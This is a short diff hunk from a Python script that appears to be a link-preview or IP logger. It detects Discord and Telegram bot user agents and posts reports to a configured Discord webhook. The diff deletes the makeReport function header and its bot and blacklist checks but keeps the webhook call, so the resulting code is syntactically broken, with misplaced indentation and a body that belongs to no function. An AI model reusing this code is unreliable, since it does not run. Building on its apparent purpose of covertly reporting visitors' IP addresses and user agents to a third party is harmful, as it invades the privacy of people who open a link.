@@ -19,14 +19,7 @@ def botCheck(ip, useragent):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
-    return False
-
-def makeReport(ip, useragent=None, endpoint="N/A", url=False):
-    if ip.startswith(blacklistedIPs):
-        return
-
-    bot = botCheck(ip, useragent)
-    if bot:
+  
         requests.post(config["webhook"], json={
             "username": config["username"],
             "content": "",
